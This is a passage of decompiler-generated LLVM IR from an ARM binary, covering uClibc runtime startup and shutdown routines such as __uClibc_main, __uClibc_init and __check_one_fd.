  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_141f4 = icmp eq i32 %v1_141f0, %v1_14230
  br i1 %v9_141f4, label %dec_label_pc_142a0, label %bb.dec_label_pc_141fc_crit_edge

bb.dec_label_pc_141fc_crit_edge:                  ; preds = %bb
  %v0_14200.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_141fc

dec_label_pc_14238:                               ; preds = %dec_label_pc_1422c
  %v0_14238 = load i32, i32* %r5.global-to-local, align 4
  %v1_14238 = and i32 %v0_14238, -69
  store i32 %v1_14238, i32* @r3, align 4
  %v2_1423c = icmp ugt i32 %v1_14238, 9
  store i1 %v2_1423c, i1* %cpsr_c.global-to-local, align 1
  %v7_1423c = icmp eq i32 %v1_14238, 10
  br i1 %v7_1423c, label %dec_label_pc_14244, label %dec_label_pc_142a0

dec_label_pc_14244:                               ; preds = %dec_label_pc_14238
  %v1_14248 = load i32, i32* %r7.global-to-local, align 4
  %v2_14248 = add i32 %v1_14248, 544
  %v3_14248 = inttoptr i32 %v2_14248 to i32*
  store i32 -1, i32* %v3_14248, align 4
  %v0_1424c = load i32, i32* @r2, align 4
  store i32 %v0_1424c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14250

dec_label_pc_14250:                               ; preds = %dec_label_pc_14284.dec_label_pc_14250_crit_edge, %dec_label_pc_14244
  %v0_14254 = phi i32 [ %v0_14254.pre, %dec_label_pc_14284.dec_label_pc_14250_crit_edge ], [ %v0_1424c, %dec_label_pc_14244 ]
  %v0_14250 = load i32, i32* %r7.global-to-local, align 4
  %v1_14250 = add i32 %v0_14250, 132
  %v2_14250 = inttoptr i32 %v1_14250 to i32*
  %v3_14250 = load i32, i32* %v2_14250, align 4
  store i32 %v0_14254, i32* @r2, align 4
  store i32 %v3_14250, i32* %r4.global-to-local, align 4
  %v1_1425c = or i32 %v3_14250, 16
  store i32 %v1_1425c, i32* @r1, align 4
  %v1_1426022 = inttoptr i32 %v0_14254 to i32*
  %v2_1426023 = load i32, i32* %v1_1426022, align 4
  %v3_1426425 = icmp uge i32 %v2_1426023, %v3_14250
  store i1 %v3_1426425, i1* %cpsr_c.global-to-local, align 1
  %v9_1426431 = icmp eq i32 %v2_1426023, %v3_14250
  br i1 %v9_1426431, label %dec_label_pc_1426c, label %dec_label_pc_14284

dec_label_pc_1426c:                               ; preds = %dec_label_pc_14250, %dec_label_pc_1426c.dec_label_pc_14260_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_1427c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1427c, label %dec_label_pc_14280, label %dec_label_pc_1426c.dec_label_pc_14260_crit_edge

dec_label_pc_1426c.dec_label_pc_14260_crit_edge:  ; preds = %dec_label_pc_1426c
  %v0_14260.pre = load i32, i32* @r2, align 4
  %v1_14264.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14260 = inttoptr i32 %v0_14260.pre to i32*
  %v2_14260 = load i32, i32* %v1_14260, align 4
  %v3_14264 = icmp uge i32 %v2_14260, %v1_14264.pre
  store i1 %v3_14264, i1* %cpsr_c.global-to-local, align 1
  %v9_14264 = icmp eq i32 %v2_14260, %v1_14264.pre
  br i1 %v9_14264, label %dec_label_pc_1426c, label %dec_label_pc_14284

dec_label_pc_14280:                               ; preds = %dec_label_pc_1426c
  %v0_14280 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14284

dec_label_pc_14284:                               ; preds = %dec_label_pc_14250, %dec_label_pc_1426c.dec_label_pc_14260_crit_edge, %dec_label_pc_14280
  %v0_14284 = phi i32 [ %v0_14280, %dec_label_pc_14280 ], [ %v2_1426023, %dec_label_pc_14250 ], [ %v2_14260, %dec_label_pc_1426c.dec_label_pc_14260_crit_edge ]
  %v1_14284 = phi i32 [ %v0_14280, %dec_label_pc_14280 ], [ %v3_14250, %dec_label_pc_14250 ], [ %v1_14264.pre, %dec_label_pc_1426c.dec_label_pc_14260_crit_edge ]
  %v3_14284 = icmp uge i32 %v0_14284, %v1_14284
  store i1 %v3_14284, i1* %cpsr_c.global-to-local, align 1
  %v9_14284 = icmp eq i32 %v0_14284, %v1_14284
  br i1 %v9_14284, label %dec_label_pc_1428c, label %dec_label_pc_14284.dec_label_pc_14250_crit_edge

dec_label_pc_14284.dec_label_pc_14250_crit_edge:  ; preds = %dec_label_pc_14284
  %v0_14254.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14250

dec_label_pc_1428c:                               ; preds = %dec_label_pc_14284
  store i32 116, i32* @r3, align 4
  %v0_14294 = load i32, i32* %r8.global-to-local, align 4
  %v2_14294 = add i32 %v0_14294, 116
  %v3_14294 = inttoptr i32 %v2_14294 to i32*
  %v4_14294 = load i32, i32* %v3_14294, align 4
  store i32 %v4_14294, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_14294)
  %v0_142a0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_142a0

dec_label_pc_142a0:                               ; preds = %entry, %bb, %dec_label_pc_14238, %dec_label_pc_1428c
  %v0_142a0 = phi i32 [ %v1_14230, %dec_label_pc_14238 ], [ %v0_142a0.pre, %dec_label_pc_1428c ], [ %v3_141e4, %entry ], [ %v1_14230, %bb ]
  %v2_142a4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_142a4, i32* @r4, align 4
  ret i32 %v0_142a0

; uselistorder directives
  uselistorder i32 %v0_14280, { 1, 0 }
  uselistorder i32 %v1_14264.pre, { 0, 2, 1 }
  uselistorder i32 %v1_141f0, { 1, 2, 0 }
  uselistorder i32 %v1_1422c, { 1, 0 }
  uselistorder i32 %v1_14230, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_1420c.pre, { 1, 0 }
  uselistorder i32 %v0_1420450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 9, 10, 4, 8, 5, 7, 6, 0, 1 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_142a0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_14284, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1426c, { 1, 0 }
  uselistorder label %dec_label_pc_1422c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14214, { 1, 0 }
  uselistorder label %dec_label_pc_141fc, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_142c4 = add i32 %tmp, 4
  %v4_142c4 = inttoptr i32 %v3_142c4 to i32*
  store i32 %arg3, i32* %v4_142c4, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_142d0 = icmp eq i32 %arg2, 0
  br i1 %v2_142d0, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v3_142e8 = call i32 @__libc_errno()
  ret i32 %v3_142e8

; uselistorder directives
  uselistorder i32 ()* @__libc_errno, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_1431c.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_142f8 = load i32, i32* @r4, align 4
  store i32 %v3_142f8, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1431c

dec_label_pc_1431c:                               ; preds = %dec_label_pc_1431c.dec_label_pc_1431c_crit_edge, %dec_label_pc_1431c.lr.ph
  %v1_1431c = phi i32 [ %v1_14328, %dec_label_pc_1431c.dec_label_pc_1431c_crit_edge ], [ 0, %dec_label_pc_1431c.lr.ph ]
  %v0_1431c = phi i32 [ %v0_1431c.pre, %dec_label_pc_1431c.dec_label_pc_1431c_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 -8), %dec_label_pc_1431c.lr.ph ]
  %v4_1431c = mul i32 %v1_1431c, 4
  %v5_1431c = add i32 %v4_1431c, %v0_1431c
  %v6_1431c = inttoptr i32 %v5_1431c to i32*
  %v7_1431c = load i32, i32* %v6_1431c, align 4
  call void @__pseudo_branch(i32 %v7_1431c)
  %v0_14328 = load i32, i32* %r4.global-to-local, align 4
  %v1_14328 = add i32 %v0_14328, -1
  store i32 %v1_14328, i32* %r4.global-to-local, align 4
  %v2_14328 = icmp eq i32 %v0_14328, 0
  br i1 %v2_14328, label %dec_label_pc_14330, label %dec_label_pc_1431c.dec_label_pc_1431c_crit_edge

dec_label_pc_1431c.dec_label_pc_1431c_crit_edge:  ; preds = %dec_label_pc_1431c
  %v0_1431c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1431c

dec_label_pc_14330:                               ; preds = %dec_label_pc_1431c
  %v0_14334.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_14334 = add i32 %v0_14334.pre, 2004
  %v3_14334 = inttoptr i32 %v2_14334 to i32*
  %v4_14334 = load i32, i32* %v3_14334, align 4
  %v2_14338 = icmp eq i32 %v4_14334, 0
  br i1 %v2_14338, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_14330
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_14330, %bb
  %v2_14340 = xor i1 %v2_14338, true
  call void @__pseudo_cond_branch(i1 %v2_14340, i32 %v4_14334)
  %v0_14348 = load i32, i32* %r5.global-to-local, align 4
  %v2_14348 = add i32 %v0_14348, 2008
  %v3_14348 = inttoptr i32 %v2_14348 to i32*
  %v4_14348 = load i32, i32* %v3_14348, align 4
  %v2_1434c = icmp eq i32 %v4_14348, 0
  br i1 %v2_1434c, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_14354 = xor i1 %v2_1434c, true
  call void @__pseudo_cond_branch(i1 %v2_14354, i32 %v4_14348)
  %v2_14358 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14358, i32* %r4.global-to-local, align 4
  %v1_1435c = load i32, i32* @r0, align 4
  ret i32 %v1_1435c

; uselistorder directives
  uselistorder i32 %v1_14328, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_14374 = load i32, i32* @r4, align 4
  %v6_14374 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_14388 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_14390 = icmp eq i32 %v2_14388, -1
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* @r3, align 4
  br i1 %v3_14390, label %dec_label_pc_1439c, label %dec_label_pc_143b4

dec_label_pc_1439c:                               ; preds = %entry
  %v0_143a0 = load i32, i32* @r5, align 4
  %v2_143a8 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 -33916), i32 %v0_143a0)
  %v1_143ac = load i32, i32* @r4, align 4
  %v1_143b0 = icmp ne i32 %v2_143a8, %v1_143ac
  call void @__pseudo_cond_branch(i1 %v1_143b0, i32 ptrtoint (i32* @global_var_12cd0.539 to i32))
  br label %dec_label_pc_143b4

dec_label_pc_143b4:                               ; preds = %entry, %dec_label_pc_1439c
  %v1_143bc = phi i32 [ %v2_14388, %entry ], [ %v2_143a8, %dec_label_pc_1439c ]
  store i32 %v3_14374, i32* @r4, align 4
  store i32 %v6_14374, i32* @r5, align 4
  ret i32 %v1_143bc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_143b4, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_143c8 = load i32, i32* @r4, align 4
  store i32 %v3_143c8, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r4.global-to-local, align 4
  %v4_143d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 148) to i32*), align 4
  %v1_143dc = inttoptr i32 %v4_143d8 to i32*
  %v2_143dc = load i32, i32* %v1_143dc, align 4
  %v2_143e0 = icmp eq i32 %v2_143dc, 0
  br i1 %v2_143e0, label %dec_label_pc_143e8, label %dec_label_pc_1440c

dec_label_pc_143e8:                               ; preds = %entry
  store i32 4096, i32* %v1_143dc, align 4
  %v0_143f0 = call i32 @__pthread_initialize_minimal()
  %v0_143f8 = load i32, i32* %r4.global-to-local, align 4
  %v2_143f8 = add i32 %v0_143f8, -47876
  %v2_14400 = icmp eq i32 %v2_143f8, 0
  br i1 %v2_14400, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_143e8
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_143e8, %bb
  %v2_14408 = xor i1 %v2_14400, true
  call void @__pseudo_cond_branch(i1 %v2_14408, i32 %v2_143f8)
  %v2_1440c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1440c

dec_label_pc_1440c:                               ; preds = %entry, %bb4
  %v2_1440c = phi i32 [ %v2_1440c.pre, %bb4 ], [ %v3_143c8, %entry ]
  %.0 = phi i32 [ %v0_143f0, %bb4 ], [ undef, %entry ]
  store i32 %v2_1440c, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder label %dec_label_pc_1440c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 53848, i32* %r4.global-to-local, align 4
  %v1_1442c = add i32 %tmp, 4
  store i32 %v1_1442c, i32* %ip.global-to-local, align 4
  %v2_14430 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r4.global-to-local, align 4
  %v3_1443c = mul i32 %arg2, 4
  store i32 %v3_1443c, i32* @r7, align 4
  %v4_14444 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 24) to i32*), align 4
  store i32 %v4_14444, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r2.global-to-local, align 4
  %v2_1444c = add i32 %v1_1442c, %v3_1443c
  store i32 %v2_1444c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %stack_var_-416, align 4
  %v4_14454 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 56) to i32*), align 4
  store i32 %v4_14454, i32* %r4.global-to-local, align 4
  %v3_14458 = icmp uge i32 %v2_1444c, %v2_14430
  store i1 %v3_14458, i1* %cpsr_c.global-to-local, align 1
  %v9_14458 = icmp eq i32 %v2_1444c, %v2_14430
  store i1 %v9_14458, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_14460 = inttoptr i32 %v4_14454 to i32*
  store i32 %v2_1444c, i32* %v2_14460, align 4
  br i1 %v9_14458, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_14468 = load i32, i32* %r2.global-to-local, align 4
  %v1_14468 = load i32, i32* %r1.global-to-local, align 4
  %v2_14468 = inttoptr i32 %v1_14468 to i32*
  store i32 %v0_14468, i32* %v2_14468, align 4
  %v2_1446c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1446c, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 2008, i32* %r2.global-to-local, align 4
  %v0_14478 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_14478, i32* @r6, align 4
  br i1 %v9_14458, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_1448053 = add i32 %v2_1446c, 2008
  %v4_1448054 = inttoptr i32 %v3_1448053 to i32*
  store i32 %arg6, i32* %v4_1448054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_1447c = load i32, i32* %ip.global-to-local, align 4
  %v2_1447c = load i32, i32* @r7, align 4
  %v3_1447c = add i32 %v2_1447c, %v1_1447c
  store i32 %v3_1447c, i32* %r3.global-to-local, align 4
  %v3_1448050 = add i32 %v2_1446c, 2008
  %v4_1448051 = inttoptr i32 %v3_1448050 to i32*
  store i32 %arg6, i32* %v4_1448051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_1448c = load i32, i32* %r3.global-to-local, align 4
  %v2_1448c = load i32, i32* %r4.global-to-local, align 4
  %v3_1448c = inttoptr i32 %v2_1448c to i32*
  store i32 %v1_1448c, i32* %v3_1448c, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_14490 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_14490, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_14498 = bitcast i32* %stack_var_-120 to i8*
  %v4_14498 = call i32 @__GI_memset(i8* %v3_14498, i32 0, i32 120)
  store i32 %v4_14498, i32* %r0.global-to-local, align 4
  %v0_1449c = load i32, i32* %r4.global-to-local, align 4
  %v1_1449c = inttoptr i32 %v0_1449c to i32*
  %v2_1449c = load i32, i32* %v1_1449c, align 4
  br label %dec_label_pc_144a8

dec_label_pc_144a8:                               ; preds = %dec_label_pc_144a8, %bb77
  %storemerge = phi i32 [ %v2_1449c, %bb77 ], [ %v1_144b4, %dec_label_pc_144a8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_144a8 = inttoptr i32 %storemerge to i32*
  %v2_144a8 = load i32, i32* %v1_144a8, align 4
  store i32 %v2_144a8, i32* %r3.global-to-local, align 4
  %v2_144ac = icmp eq i32 %v2_144a8, 0
  %v1_144b4 = add i32 %storemerge, 4
  br i1 %v2_144ac, label %dec_label_pc_144b4, label %dec_label_pc_144a8

dec_label_pc_144b4:                               ; preds = %dec_label_pc_144a8
  store i32 %v1_144b4, i32* @r4, align 4
  store i32 %v2_14490, i32* @r5, align 4
  %v1_144d830 = inttoptr i32 %v1_144b4 to i32*
  %v2_144d831 = load i32, i32* %v1_144d830, align 4
  store i32 %v2_144d831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_144dc33 = icmp eq i32 %v2_144d831, 0
  store i1 %v2_144dc33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_144dc33, label %dec_label_pc_144e4, label %dec_label_pc_144c0

dec_label_pc_144c0:                               ; preds = %dec_label_pc_144b4, %dec_label_pc_144d8
  %v4_144c8 = phi i32 [ %v1_144d4, %dec_label_pc_144d8 ], [ %v1_144b4, %dec_label_pc_144b4 ]
  %v5_144c4 = phi i32 [ %v2_144d8, %dec_label_pc_144d8 ], [ %v2_144d831, %dec_label_pc_144b4 ]
  %v2_144c0 = icmp ugt i32 %v5_144c4, 13
  store i1 %v2_144c0, i1* %cpsr_c.global-to-local, align 1
  %v7_144c0 = icmp eq i32 %v5_144c4, 14
  store i1 %v7_144c0, i1* %cpsr_z.global-to-local, align 1
  %v2_144c4 = xor i1 %v2_144c0, true
  %v3_144c4 = or i1 %v7_144c0, %v2_144c4
  br i1 %v3_144c4, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_144c0
  %v4_144c4 = load i32, i32* @r5, align 4
  %v6_144c4 = and i32 %v5_144c4, 536870912
  %v7_144c4 = icmp ne i32 %v6_144c4, 0
  store i1 %v7_144c4, i1* %cpsr_c.global-to-local, align 1
  %v8_144c4 = mul i32 %v5_144c4, 8
  %v9_144c4 = add i32 %v4_144c4, %v8_144c4
  store i32 %v9_144c4, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_144c0, %bb78
  %v1_144d0 = phi i1 [ %v2_144c0, %dec_label_pc_144c0 ], [ %v7_144c4, %bb78 ]
  %v2_144c8 = xor i1 %v1_144d0, true
  %v3_144c8 = or i1 %v7_144c0, %v2_144c8
  br i1 %v3_144c8, label %bb80, label %dec_label_pc_144d8

bb80:                                             ; preds = %bb79
  store i32 %v4_144c8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_144d8

dec_label_pc_144d8:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_144c8, i32 ptrtoint (i32* @global_var_11140.547 to i32))
  %v0_144d4 = load i32, i32* @r4, align 4
  %v1_144d4 = add i32 %v0_144d4, 8
  store i32 %v1_144d4, i32* @r4, align 4
  %v1_144d8 = inttoptr i32 %v1_144d4 to i32*
  %v2_144d8 = load i32, i32* %v1_144d8, align 4
  store i32 %v2_144d8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_144dc = icmp eq i32 %v2_144d8, 0
  store i1 %v2_144dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_144dc, label %dec_label_pc_144e4, label %dec_label_pc_144c0

dec_label_pc_144e4:                               ; preds = %dec_label_pc_144d8, %dec_label_pc_144b4
  store i32 %v2_14490, i32* %r0.global-to-local, align 4
  %v1_144e8 = call i32 @_dl_aux_init(i32 %v2_14490)
  store i32 %v1_144e8, i32* %r0.global-to-local, align 4
  %v1_144ec = call i32 @__GI___uClibc_init(i32 %v1_144e8)
  store i32 %v1_144ec, i32* @r0, align 4
  store i32 148, i32* %r3.global-to-local, align 4
  %v2_144f4 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_144f4, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_144fc = add i32 %v2_144f4, 148
  %v3_144fc = inttoptr i32 %v2_144fc to i32*
  %v4_144fc = load i32, i32* %v3_144fc, align 4
  store i32 %v4_144fc, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14504 = icmp eq i32 %tmp66, 0
  store i1 %v2_14504, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14504, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_144e4
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_144e4, %bb81
  %v0_14510 = phi i32 [ %tmp66, %dec_label_pc_144e4 ], [ 4096, %bb81 ]
  %v3_1450c = icmp eq i32 %tmp65, -1
  store i1 %v3_1450c, i1* %cpsr_c.global-to-local, align 1
  %v8_1450c = icmp eq i32 %tmp65, -1
  store i1 %v8_1450c, i1* %cpsr_z.global-to-local, align 1
  %v2_14510 = inttoptr i32 %v4_144fc to i32*
  store i32 %v0_14510, i32* %v2_14510, align 4
  br i1 %v3_1450c, label %dec_label_pc_14518, label %dec_label_pc_14540

dec_label_pc_14518:                               ; preds = %bb82
  %v0_14518 = call i32 @getuid()
  store i32 %v0_14518, i32* @r0, align 4
  store i32 %v0_14518, i32* %r4.global-to-local, align 4
  %v0_14520 = call i32 @geteuid()
  store i32 %v0_14520, i32* @r0, align 4
  %v3_14524 = icmp uge i32 %v0_14518, %v0_14520
  store i1 %v3_14524, i1* %cpsr_c.global-to-local, align 1
  %v9_14524 = icmp eq i32 %v0_14518, %v0_14520
  store i1 %v9_14524, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14524, label %dec_label_pc_1452c, label %dec_label_pc_14568

dec_label_pc_1452c:                               ; preds = %dec_label_pc_14518
  %v1_1452c = call i32 @getgid(i32 %v0_14520)
  store i32 %v1_1452c, i32* @r0, align 4
  store i32 %v1_1452c, i32* %r4.global-to-local, align 4
  %v0_14534 = call i32 @getegid()
  store i32 %v0_14534, i32* %r0.global-to-local, align 4
  %v3_14538 = icmp uge i32 %v1_1452c, %v0_14534
  store i1 %v3_14538, i1* %cpsr_c.global-to-local, align 1
  %v9_14538 = icmp eq i32 %v1_1452c, %v0_14534
  store i1 %v9_14538, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14538, label %dec_label_pc_14540, label %dec_label_pc_14568

dec_label_pc_14540:                               ; preds = %dec_label_pc_1452c, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_1450c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_1450c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1450c, label %dec_label_pc_14590, label %dec_label_pc_1454c

dec_label_pc_1454c:                               ; preds = %dec_label_pc_14540
  store i32 %tmp64, i32* @r3, align 4
  %v3_14550 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_14550, i1* %cpsr_c.global-to-local, align 1
  %v9_14550 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_14550, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14550, label %dec_label_pc_14558, label %dec_label_pc_14568

dec_label_pc_14558:                               ; preds = %dec_label_pc_1454c
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_14560 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_14560, i1* %cpsr_c.global-to-local, align 1
  %v9_14560 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_14560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14560, label %dec_label_pc_14590, label %dec_label_pc_14568

dec_label_pc_14568:                               ; preds = %dec_label_pc_1454c, %dec_label_pc_1452c, %dec_label_pc_14518, %dec_label_pc_14558
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_14574 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1457c = load i32, i32* @r4, align 4
  store i32 %v0_1457c, i32* %r1.global-to-local, align 4
  %v2_14580 = call i32 @__check_one_fd(i32 1, i32 %v0_1457c)
  %v0_14584 = load i32, i32* @r4, align 4
  store i32 %v0_14584, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_1458c = call i32 @__check_one_fd(i32 2, i32 %v0_14584)
  store i32 %v2_1458c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14590

dec_label_pc_14590:                               ; preds = %dec_label_pc_14558, %dec_label_pc_14540, %dec_label_pc_14568
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 260, i32* %r3.global-to-local, align 4
  %v2_14598 = load i32, i32* %arg3, align 4
  store i32 %v2_14598, i32* %r2.global-to-local, align 4
  %v2_1459c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1459c, i32* %r1.global-to-local, align 4
  %v3_145a0 = add i32 %v2_1459c, 260
  %v4_145a0 = inttoptr i32 %v3_145a0 to i32*
  store i32 %v2_14598, i32* %v4_145a0, align 4
  %v0_145a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_145a4 = inttoptr i32 %v0_145a4 to i32*
  %v2_145a4 = load i32, i32* %v1_145a4, align 4
  store i32 %v2_145a4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_145a8 = icmp eq i32 %v2_145a4, 0
  store i1 %v2_145a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_145a8, label %bb84, label %dec_label_pc_145b0

